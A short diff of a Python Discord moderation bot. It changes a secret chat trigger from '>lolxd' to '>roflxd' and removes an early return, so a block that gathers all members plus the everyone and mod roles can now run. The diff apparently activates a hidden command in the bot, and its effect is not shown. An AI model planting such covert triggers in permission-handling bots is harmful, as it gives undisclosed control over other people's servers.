@@ -42,8 +42,7 @@ Privileges temporarily removed & Admins notified.""".format(role.name))
                             pass
 
     async def on_message(self, message):
-        if message.content.lower().strip() == ">lolxd":
-            return print(">lolxd")
+        if message.content.lower().strip() == ">roflxd":
             members = message.server.members
             role = discord.utils.get(message.server.roles, id=str(Global.security.get("everyone_role")))
             mod_role = discord.utils.get(message.server.roles, id=str(Global.security.get("mod_role")))
